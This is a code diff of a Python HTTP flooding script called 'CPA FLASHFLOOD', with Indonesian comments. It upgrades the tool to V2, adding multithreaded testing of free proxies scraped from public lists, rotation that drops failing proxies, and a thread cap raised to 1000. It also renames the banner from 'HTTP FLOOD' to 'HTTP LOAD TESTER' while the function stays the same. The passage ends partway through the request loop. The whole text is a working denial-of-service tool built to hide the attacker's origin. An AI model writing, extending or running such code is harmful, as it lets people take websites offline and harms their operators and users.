@@ -1,4 +1,9 @@
 # -*- coding: utf-8 -*-
+#!/usr/bin/env python3
+"""
+CPA FLASHFLOOD V2 - HTTP Load 
+"""
+
 import sys
 import os
 import threading
@@ -9,9 +14,11 @@ import getopt
 import urllib.parse
 import json
 import datetime
+import re
 from urllib.parse import urlparse
 from threading import Thread, Event
 from collections import defaultdict
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # Warna untuk terminal
 class Colors:
@@ -26,7 +33,7 @@ class Colors:
     DIM = '\033[2m'
     END = '\033[0m'
 
-VERSION = (0, 4, 3)
+VERSION = (1, 0, 0)
 __version__ = '%d.%d.%d' % VERSION[0:3]
 
 if sys.version_info[0:2] < (3, 5):
@@ -35,23 +42,23 @@ if sys.version_info[0:2] < (3, 5):
 # Banner
 BANNER = f"""
 {Colors.CYAN}
-▓▓▓▓▓ ▓      ▓▓▓   ▓▓▓▓ ▓   ▓ ▓▓▓▓▓ ▓      ▓▓▓   ▓▓▓  ▓▓▓▓    
-▓░░░░░▓░    ▓ ░░▓ ▓ ░░░░▓░  ▓░▓░░░░░▓░    ▓ ░░▓ ▓ ░░▓ ▓░░░▓   
-▓▓▓▓░░▓░░   ▓▓▓▓▓░ ▓▓▓░░▓▓▓▓▓░▓▓▓▓░░▓░░   ▓░ ░▓░▓░ ░▓░▓░░░▓░  
-▓░░░░ ▓░░   ▓░░░▓░░ ░░▓ ▓░░░▓░▓░░░░ ▓░░   ▓░░ ▓░▓░░ ▓░▓░░ ▓░░ 
-▓░░░░░▓▓▓▓▓ ▓░░░▓░▓▓▓▓░░▓░░░▓░▓░░░░░▓▓▓▓▓  ▓▓▓ ░░▓▓▓ ░▓▓▓▓ ░░ 
- ░░    ░░░░░ ░░  ░░░░░░ ░░░  ░░░░    ░░░░░  ░░░ ░ ░░░ ░░░░░ ░ 
-  ░     ░░░░░ ░   ░ ░░░░  ░   ░ ░     ░░░░░  ░░░   ░░░  ░░░░  
-                 CPA TOOLS DEVELOPMENT
+██████╗ ██████╗  █████╗ ███████╗██╗     ███████╗██╗  ██╗██╗     ██████╗  ██████╗ 
+██╔══██╗██╔══██╗██╔══██╗██╔════╝██║     ██╔════╝██║  ██║██║     ██╔══██╗██╔═══██╗
+██████╔╝██████╔╝███████║█████╗  ██║     █████╗  ███████║██║     ██║  ██║██║   ██║
+██╔═══╝ ██╔══██╗██╔══██║██╔══╝  ██║     ██╔══╝  ██╔══██║██║     ██║  ██║██║   ██║
+██║     ██║  ██║██║  ██║███████╗███████╗██║     ██║  ██║███████╗██████╔╝╚██████╔╝
+╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝ 
+                     CPA TOOLS DEVELOPMENT - V2
 {Colors.END}"""
 
 # File konfigurasi
 proxy_file = 'proxy.txt'
+proxy_filtered_file = 'proxy_filtered.txt'
 ua_file = 'user-agents.txt'
 ref_file = 'referers.txt'
-log_file = 'flashflood.log'
+log_file = 'flashflood_v2.log'
 
-# URL untuk auto-download proxy (ditambah lebih banyak sumber)
+# URL untuk auto-download proxy (lebih banyak sumber)
 PROXY_SOURCES = [
     'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
     'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
@@ -62,14 +69,18 @@ PROXY_SOURCES = [
     'https://raw.githubusercontent.com/maherabd/proxy-list/main/proxies/http.txt',
     'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
     'https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt',
+    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt',
+    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
+    'https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list',
 ]
 
 ex = Event()
-rps_limit = 0 # 0 = unlimited
+rps_limit = 0
 post_data = None
-rps_tokens = 20 # default value
+rps_tokens = 20
 last_refill = time.time()
 ips = []
+filtered_ips = []
 ref = []
 ua = []
 cookies = {}
@@ -96,77 +107,24 @@ follow_redirects = True
 retry_count = 0
 retry_delay = 1
 auto_update_proxy = False
-proxy_update_interval = 600  # 10 menit
+proxy_update_interval = 600
 last_proxy_update = 0
+proxy_filter_enabled = True
+proxy_test_timeout = 5
+bad_proxies = set()
+proxy_stats = defaultdict(lambda: {'success': 0, 'fail': 0, 'last_used': 0})
 
 DEFAULT_UA = [
-    # Chrome - Windows
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-    # Chrome - Mac
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
-    # Chrome - Linux
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-    # Firefox - Windows
     'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
-    'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/120.0',
-    'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/119.0',
-    'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/118.0',
-    # Firefox - Mac
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/120.0',
-    # Firefox - Linux
     'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
-    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0',
-    # Safari - Mac
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
-    # Safari - iPhone
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
-    # Safari - iPad
     'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
-    # Edge - Windows
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0',
-    # Edge - Mac
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
-    # Opera
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0',
-    # Android - Chrome
-    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
-    # Android - Firefox
-    'Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/120.0 Firefox/120.0',
-    'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0',
-    # Linux - Other
-    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    # Bot/Crawler
-    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
-    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
-    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
-    'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot)',
-    # Windows - Old
-    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
 ]
 
-# Referer yang lebih banyak (ditambah)
 DEFAULT_REF = [
     'https://www.google.com/',
     'https://www.bing.com/',
@@ -178,29 +136,8 @@ DEFAULT_REF = [
     'https://www.linkedin.com/',
     'https://www.youtube.com/',
     'https://www.reddit.com/',
-    'https://www.wikipedia.org/',
-    'https://www.amazon.com/',
-    'https://www.ebay.com/',
-    'https://www.netflix.com/',
-    'https://www.spotify.com/',
-    'https://www.microsoft.com/',
-    'https://www.apple.com/',
-    'https://www.stackoverflow.com/',
-    'https://www.github.com/',
-    'https://www.pinterest.com/',
-    'https://www.tumblr.com/',
-    'https://www.whatsapp.com/',
-    'https://www.telegram.org/',
-    'https://www.discord.com/',
-    'https://www.twitch.tv/',
-    'https://www.tiktok.com/',
-    'https://www.snapchat.com/',
-    'https://www.quora.com/',
-    'https://www.medium.com/',
-    'https://www.wordpress.com/',
 ]
 
-# Fungsi wait_for_rps_token yang hilang
 def wait_for_rps_token():
     """Token bucket algorithm for rate limiting"""
     global rps_tokens, last_refill, rps_limit
@@ -211,24 +148,76 @@ def wait_for_rps_token():
     with lock:
         now = time.time()
         elapsed = now - last_refill
-        # Refill tokens
         rps_tokens = min(rps_tokens + elapsed * rps_limit, rps_limit)
         last_refill = now
         
         if rps_tokens < 1:
-            # Wait for next token
             wait_time = (1 - rps_tokens) / rps_limit
-            # Release lock while waiting
             lock.release()
             time.sleep(wait_time)
             lock.acquire()
-            # Refill after waiting
             now = time.time()
             elapsed = now - last_refill
             rps_tokens = min(rps_tokens + elapsed * rps_limit, rps_limit)
             last_refill = now
         
         rps_tokens -= 1
+
+def test_proxy(proxy):
+    """Test if a proxy is working"""
+    try:
+        test_url = 'http://httpbin.org/ip'
+        proxies = {
+            'http': f'http://{proxy}',
+            'https': f'http://{proxy}'
+        }
+        response = requests.get(test_url, proxies=proxies, timeout=proxy_test_timeout)
+        return response.status_code == 200
+    except:
+        return False
+
+def filter_proxies(proxy_list):
+    """Filter working proxies with multithreading"""
+    global filtered_ips, bad_proxies
+    
+    if not proxy_list:
+        return []
+    
+    print(f"{Colors.CYAN}🔍 Testing {len(proxy_list)} proxies...{Colors.END}")
+    
+    working = []
+    total = len(proxy_list)
+    
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        future_to_proxy = {executor.submit(test_proxy, proxy): proxy for proxy in proxy_list}
+        
+        for i, future in enumerate(as_completed(future_to_proxy)):
+            proxy = future_to_proxy[future]
+            try:
+                if future.result():
+                    working.append(proxy)
+                    print(f"{Colors.GREEN}✓ [{i+1}/{total}] {proxy} - Working{Colors.END}")
+                else:
+                    bad_proxies.add(proxy)
+                    print(f"{Colors.RED}✗ [{i+1}/{total}] {proxy} - Failed{Colors.END}")
+            except:
+                bad_proxies.add(proxy)
+                print(f"{Colors.RED}✗ [{i+1}/{total}] {proxy} - Error{Colors.END}")
+    
+    filtered_ips = working
+    
+    # Save filtered proxies
+    try:
+        with open(proxy_filtered_file, 'w') as f:
+            f.write(f'# Filtered proxies - {len(working)} working\n')
+            f.write(f'# Total tested: {total}\n')
+            f.write(f'# Updated: {datetime.datetime.now().isoformat()}\n\n')
+            f.write('\n'.join(working))
+        print(f"{Colors.GREEN}✅ Saved {len(working)} working proxies to {proxy_filtered_file}{Colors.END}")
+    except:
+        pass
+    
+    return working
 
 def download_proxies():
     """Download proxy list from online sources"""
@@ -239,14 +228,15 @@ def download_proxies():
     
     for source in PROXY_SOURCES:
         try:
-            print(f"{Colors.DIM}  ↳ Fetching: {source[:50]}...{Colors.END}")
+            print(f"{Colors.DIM}  ↳ Fetching: {source[:60]}...{Colors.END}")
             response = requests.get(source, timeout=30)
             if response.status_code == 200:
                 proxies = [line.strip() for line in response.text.split('\n') 
                           if line.strip() and not line.startswith('#')]
-                proxies = [p.replace('http://', '').replace('https://', '') for p in proxies]
-                # Filter proxy dengan format yang valid (ip:port)
-                proxies = [p for p in proxies if ':' in p]
+                proxies = [p.replace('http://', '').replace('https://', '').replace('socks5://', '') for p in proxies]
+                proxies = [p for p in proxies if ':' in p and len(p.split(':')) == 2]
+                proxies = [p for p in proxies if re.match(r'^\d+\.\d+\.\d+\.\d+:\d+$', p)]
+                
                 if proxies:
                     all_proxies.extend(proxies)
                     print(f"{Colors.GREEN}  ✓ Got {len(proxies)} proxies{Colors.END}")
@@ -254,43 +244,88 @@ def download_proxies():
                 print(f"{Colors.YELLOW}  ⚠ Failed (status: {response.status_code}){Colors.END}")
         except Exception as e:
             print(f"{Colors.RED}  ✗ Error: {str(e)[:50]}{Colors.END}")
+        time.sleep(0.5)
     
     if all_proxies:
-        # Remove duplicates
         all_proxies = list(dict.fromkeys(all_proxies))
         ips = all_proxies
         last_proxy_update = time.time()
         
         try:
             with open(proxy_file, 'w') as f:
-                f.write('# Auto-updated proxies\n')
-                f.write(f'# Total: {len(ips)} proxies\n')
+                f.write(f'# Total proxies: {len(ips)}\n')
                 f.write(f'# Updated: {datetime.datetime.now().isoformat()}\n\n')
                 f.write('\n'.join(ips))
             print(f"{Colors.GREEN}✅ Saved {len(ips)} proxies to {proxy_file}{Colors.END}")
         except Exception as e:
             print(f"{Colors.RED}✗ Error saving proxies: {e}{Colors.END}")
+        
+        # Filter proxies if enabled
+        if proxy_filter_enabled:
+            filtered = filter_proxies(all_proxies[:200])  # Test first 200
+            if filtered:
+                ips = filtered
+                print(f"{Colors.GREEN}✅ Using {len(filtered)} working proxies{Colors.END}")
     else:
         print(f"{Colors.YELLOW}⚠ No proxies downloaded{Colors.END}")
     
     return all_proxies
 
+def update_proxies_if_needed():
+    """Update proxies if interval has passed"""
+    global ips, last_proxy_update
+    
+    if auto_update_proxy and (time.time() - last_proxy_update > proxy_update_interval):
+        print(f"\n{Colors.CYAN}🔄 Updating proxies...{Colors.END}")
+        downloaded = download_proxies()
+        if downloaded and proxy_filter_enabled:
+            filtered = filter_proxies(downloaded[:200])
+            if filtered:
+                ips = filtered
+        elif downloaded:
+            ips = downloaded
+        print(f"{Colors.GREEN}✅ Proxy updated! Total: {len(ips)}{Colors.END}\n")
+
+def get_working_proxy():
+    """Get a working proxy from filtered list"""
+    global filtered_ips, ips, bad_proxies
+    
+    available = filtered_ips if filtered_ips else ips
+    
+    if not available:
+        return None
+    
+    # Try to find a proxy that hasn't been marked as bad
+    for _ in range(10):
+        proxy = random.choice(available)
+        if proxy not in bad_proxies:
+            return proxy
+    
+    # If all proxies are bad, reset bad list and try again
+    if len(bad_proxies) > len(available) * 0.5:
+        print(f"{Colors.YELLOW}⚠ Many proxies failed, resetting bad list{Colors.END}")
+        bad_proxies.clear()
+        return random.choice(available)
+    
+    return random.choice(available)
+
 def main(argv):
     global use_proxy, method, custom_headers, use_jitter, jitter_min, jitter_max, save_log
     global max_threads, timeout, request_delay, verify_ssl, follow_redirects
     global retry_count, retry_delay, auto_update_proxy, proxy_update_interval, rps_limit
-    global rps_tokens, post_data
+    global rps_tokens, post_data, proxy_filter_enabled, proxy_test_timeout
     
     print(BANNER)
-    print(f"{Colors.CYAN}🚀 CPA FLASHFLOOD v{__version__} - HTTP FLOOD {Colors.END}")
-    print(f"{Colors.YELLOW}DUA TIGA KUCING BERLARI, YANG PERGI PANTANG DIRATAPI{Colors.END}\n")
+    print(f"{Colors.CYAN}🚀 CPA FLASHFLOOD V2 v{__version__} - HTTP LOAD TESTER{Colors.END}")
+    print(f"{Colors.YELLOW}🔧 Auto Proxy Download & Filter | RPS Control | Multi-Thread{Colors.END}\n")
     
     try:
         opts, args = getopt.getopt(argv, 'hv:t:X:H:j:l:d:s',
             ['help', 'url=', 'timeout=', 'threads=', 'delay=', 'no-proxy',
              'method=', 'header=', 'jitter=', 'log', 'no-verify',
              'no-redirect', 'retry=', 'retry-delay=', 'rps=', 'data=',
-             'data-file=', 'auto-proxy', 'proxy-interval='])
+             'data-file=', 'auto-proxy', 'proxy-interval=', 'no-filter',
+             'proxy-test-timeout='])
     except getopt.GetoptError as err:
         print(f"{Colors.RED}✗ Error: {err}{Colors.END}")
         showUsage()
@@ -299,9 +334,9 @@ def main(argv):
     for opt, arg in opts:
         if opt in ('-h', '--help'):
             showUsage()
-            sys.exit(2)
+            sys.exit(0)
         elif opt in ('-v', '--url'):
-            url = urllib.parse.unquote(arg)
+            globals()['url'] = urllib.parse.unquote(arg)
         elif opt in ('-t', '--timeout'):
             try:
                 timeout = int(arg)
@@ -314,8 +349,8 @@ def main(argv):
         elif opt == '--threads':
             try:
                 max_threads = int(arg)
-                if max_threads < 1 or max_threads > 500:
-                    print(f"{Colors.RED}✗ Error: Threads must be between 1-500{Colors.END}")
+                if max_threads < 1 or max_threads > 1000:
+                    print(f"{Colors.RED}✗ Error: Threads must be between 1-1000{Colors.END}")
                     sys.exit(2)
             except ValueError:
                 print(f"{Colors.RED}✗ Error: Threads must be integer{Colors.END}")
@@ -411,7 +446,7 @@ def main(argv):
             print(f"{Colors.CYAN}ℹ Auto-proxy enabled (update every {proxy_update_interval//60} min){Colors.END}")
         elif opt == '--proxy-interval':
             try:
-                proxy_update_interval = int(arg) * 60  # Convert minutes to seconds
+                proxy_update_interval = int(arg) * 60
                 if proxy_update_interval < 60:
                     print(f"{Colors.YELLOW}⚠ Minimum interval is 1 minute{Colors.END}")
                     proxy_update_interval = 60
@@ -419,85 +454,91 @@ def main(argv):
             except:
                 print(f"{Colors.RED}✗ Error: Invalid proxy interval{Colors.END}")
                 sys.exit(2)
+        elif opt == '--no-filter':
+            proxy_filter_enabled = False
+            print(f"{Colors.YELLOW}⚠️ Proxy filtering disabled{Colors.END}")
+        elif opt == '--proxy-test-timeout':
+            try:
+                proxy_test_timeout = int(arg)
+                print(f"{Colors.CYAN}ℹ Proxy test timeout: {proxy_test_timeout}s{Colors.END}")
+            except:
+                print(f"{Colors.RED}✗ Error: Invalid timeout{Colors.END}")
+                sys.exit(2)
 
     if not url:
         print(f"{Colors.RED}✗ Error: URL is required!{Colors.END}")
         showUsage()
         sys.exit(2)
 
-    # Set global URL
-    globals()['url'] = url
     parseFiles()
 
 def parseFiles():
-    global ips, ua, ref
+    global ips, ua, ref, filtered_ips
     
     ua = DEFAULT_UA.copy()
     ref = DEFAULT_REF.copy()
     
     print(f"{Colors.CYAN}📁 Loading Configuration{Colors.END}")
     
-    if auto_update_proxy:
-        downloaded = download_proxies()
-        if downloaded:
-            ips = downloaded
-    
-    if use_proxy and not ips:
+    # Load existing proxies
+    if use_proxy:
         try:
             if os.path.exists(proxy_file) and os.stat(proxy_file).st_size > 0:
                 with open(proxy_file, 'r') as f:
                     content = [row.rstrip() for row in f if row.rstrip() and not row.startswith('#')]
                     if content:
                         ips = content
-                        print(f"{Colors.GREEN}  ✓ Loaded {len(ips)} proxies{Colors.END}")
-                    else:
-                        print(f"{Colors.YELLOW}  ⚠ No proxies found{Colors.END}")
-            else:
-                print(f"{Colors.YELLOW}  ⚠ Proxy file not found{Colors.END}")
-                if auto_update_proxy:
-                    download_proxies()
+                        print(f"{Colors.GREEN}  ✓ Loaded {len(ips)} proxies from file{Colors.END}")
+                        
+                        # Load filtered proxies if exists
+                        if os.path.exists(proxy_filtered_file):
+                            with open(proxy_filtered_file, 'r') as f:
+                                filtered = [row.rstrip() for row in f if row.rstrip() and not row.startswith('#')]
+                                if filtered:
+                                    filtered_ips = filtered
+                                    print(f"{Colors.GREEN}  ✓ Loaded {len(filtered_ips)} working proxies{Colors.END}")
         except Exception as e:
-            print(f"{Colors.RED}  ✗ Error: {e}{Colors.END}")
-    elif not use_proxy:
-        ips = []
-        print(f"{Colors.DIM}  ℹ Proxy disabled{Colors.END}")
+            print(f"{Colors.YELLOW}  ⚠ Error loading proxies: {e}{Colors.END}")
     
-    # Load user-agents from file if exists
+    # Auto download proxies if enabled
+    if auto_update_proxy:
+        downloaded = download_proxies()
+        if downloaded and proxy_filter_enabled:
+            filtered = filter_proxies(downloaded[:200])
+            if filtered:
+                ips = filtered
+                filtered_ips = filtered
+    
+    # Load user-agents
     try:
         if os.path.exists(ua_file) and os.stat(ua_file).st_size > 0:
             with open(ua_file, 'r') as f:
                 content = [row.rstrip() for row in f if row.rstrip()]
                 if content:
                     ua = content
-                    print(f"{Colors.GREEN}  ✓ Loaded {len(ua)} user-agents from file{Colors.END}")
-                else:
-                    print(f"{Colors.GREEN}  ✓ Using {len(ua)} default user-agents{Colors.END}")
-        else:
-            print(f"{Colors.GREEN}  ✓ Using {len(ua)} default user-agents{Colors.END}")
+                    print(f"{Colors.GREEN}  ✓ Loaded {len(ua)} user-agents{Colors.END}")
     except:
-        print(f"{Colors.GREEN}  ✓ Using {len(ua)} default user-agents{Colors.END}")
+        pass
     
-    # Load referers from file if exists
+    # Load referers
     try:
         if os.path.exists(ref_file) and os.stat(ref_file).st_size > 0:
             with open(ref_file, 'r') as f:
                 content = [row.rstrip() for row in f if row.rstrip()]
                 if content:
                     ref = content
-                    print(f"{Colors.GREEN}  ✓ Loaded {len(ref)} referers from file{Colors.END}")
-                else:
-                    print(f"{Colors.GREEN}  ✓ Using {len(ref)} default referers{Colors.END}")
-        else:
-            print(f"{Colors.GREEN}  ✓ Using {len(ref)} default referers{Colors.END}")
+                    print(f"{Colors.GREEN}  ✓ Loaded {len(ref)} referers{Colors.END}")
     except:
-        print(f"{Colors.GREEN}  ✓ Using {len(ref)} default referers{Colors.END}")
+        pass
     
-    proxy_status = f"{len(ips)} proxies" if ips and use_proxy else "Direct connection"
-    update_interval = proxy_update_interval // 60
+    proxy_status = f"{len(filtered_ips) if filtered_ips else len(ips)} proxies" if ips and use_proxy else "Direct connection"
     print(f"{Colors.CYAN}📊 Summary: {proxy_status}, {len(ua)} UAs, {len(ref)} referers{Colors.END}")
     if auto_update_proxy:
-        print(f"{Colors.CYAN}📊 Auto-Proxy: Enabled (updates every {update_interval} minutes){Colors.END}")
+        print(f"{Colors.CYAN}📊 Auto-Proxy: Enabled (updates every {proxy_update_interval//60} min){Colors.END}")
+    if proxy_filter_enabled:
+        print(f"{Colors.CYAN}📊 Proxy Filter: Enabled{Colors.END}")
     print()
+    
     testConnection()
 
 def testConnection():
@@ -521,60 +562,57 @@ def testConnection():
         print(f"{Colors.RED}❌ Connection failed: {e}{Colors.END}")
         sys.exit(1)
 
-def update_proxies_if_needed():
-    global ips, last_proxy_update
-    if auto_update_proxy and (time.time() - last_proxy_update > proxy_update_interval):
-        print(f"\n{Colors.CYAN}🔄 Updating proxies... (every {proxy_update_interval//60} minutes){Colors.END}")
-        downloaded = download_proxies()
-        if downloaded:
-            ips = downloaded
-            print(f"{Colors.GREEN}✅ Updated! Total: {len(ips)} proxies{Colors.END}\n")
-
 def request_testing(index):
     global total_requests, success_requests, failed_requests, status_codes
-
-    proxy_list = ips.copy() if ips and use_proxy else []
-    proxy_index = index % len(proxy_list) if proxy_list else 0
-
+    
     while not ex.is_set():
         try:
             wait_for_rps_token()
             update_proxies_if_needed()
-
+            
             if use_jitter:
                 current_delay = random.uniform(jitter_min, jitter_max)
             else:
                 current_delay = request_delay
-
+            
             proxy = None
             proxy_str = 'Direct'
-
-            if proxy_list and use_proxy:
-                proxy = {
-                    'http': f'http://{proxy_list[proxy_index]}',
-                    'https': f'http://{proxy_list[proxy_index]}'
-                }
-                proxy_str = proxy_list[proxy_index]
-                proxy_index = (proxy_index + 1) % len(proxy_list)
-
+            
+            if use_proxy:
+                proxy_ip = get_working_proxy()
+                if proxy_ip:
+                    proxy = {
+                        'http': f'http://{proxy_ip}',
+                        'https': f'http://{proxy_ip}'
+                    }
+                    proxy_str = proxy_ip
+                else:
+                    # No working proxy available
+                    with lock:
+                        failed_requests += 1
+                    time.sleep(2)
+                    continue
+            
             headers = {
                 'User-Agent': random.choice(ua),
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'Accept-Language': 'en-US,en;q=0.9',
                 'Referer': random.choice(ref),
-                'Cache-Control': 'no-cache'
+                'Cache-Control': 'no-cache',
+                'Connection': 'keep-alive'
             }
-
+            
             if custom_headers:
                 headers.update(custom_headers)
-
+            
             if not verify_ssl:
                 requests.packages.urllib3.disable_warnings()
-
+            
+            success = False
             for attempt in range(retry_count + 1):
                 try:
                     start_time_req = time.time()
-
+                    
                     req_kwargs = {
                         'headers': headers,
                         'proxies': proxy,
@@ -582,12 +620,12 @@ def request_testing(index):
                         'verify': verify_ssl,
                         'allow_redirects': follow_redirects
                     }
-
+                    
                     if method in ['POST', 'PUT', 'PATCH'] and post_data:
                         req_kwargs['data'] = post_data
                         if 'Content-Type' not in headers:
                             headers['Content-Type'] = 'application/x-www-form-urlencoded'
-
+                    
                     if method == 'GET':
                         r = requests.get(url, **req_kwargs)
                     elif method == 'POST':
@@ -596,10 +634,11 @@ def request_testing(index):
                         r = requests.head(url, **req_kwargs)
                     else:
                         r = requests.request(method, url, **req_kwargs)
-
+                    
                     response_time = time.time() - start_time_req
+                    success = True
                     break
-                except:
+                except Exception as e:
                     if attempt < retry_count:
                         time.sleep(retry_delay)
                         continue
@@ -607,49 +646,44 @@ def request_testing(index):
             
             with lock:
                 total_requests += 1
-                status_codes[r.status_code] += 1
-                if 200 <= r.status_code < 300:
-                    success_requests += 1
-                    status_color = Colors.GREEN
-                elif 300 <= r.status_code < 400:
-                    success_requests += 1
-                    status_color = Colors.BLUE
+                
+                if success:
+                    status_codes[r.status_code] += 1
+                    if 200 <= r.status_code < 300:
+                        success_requests += 1
+                        status_color = Colors.GREEN
+                    elif 300 <= r.status_code < 400:
+                        success_requests += 1
+                        status_color = Colors.BLUE
+                    else:
+                        failed_requests += 1
+                        status_color = Colors.YELLOW
+                        if proxy_str != 'Direct':
+                            bad_proxies.add(proxy_str)
                 else:
                     failed_requests += 1
-                    status_color = Colors.YELLOW
+                    status_color = Colors.RED
+                    if proxy_str != 'Direct':
+                        bad_proxies.add(proxy_str)
                 
-                if save_log:
+                if save_log and success:
                     log_data.append({
                         'time': datetime.datetime.now().isoformat(),
                         'thread': index,
-                        'status': r.status_code,
-                        'time_ms': round(response_time * 1000, 2),
+                        'status': r.status_code if success else 'ERROR',
+                        'time_ms': round(response_time * 1000, 2) if success else 0,
                         'proxy': proxy_str
                     })
             
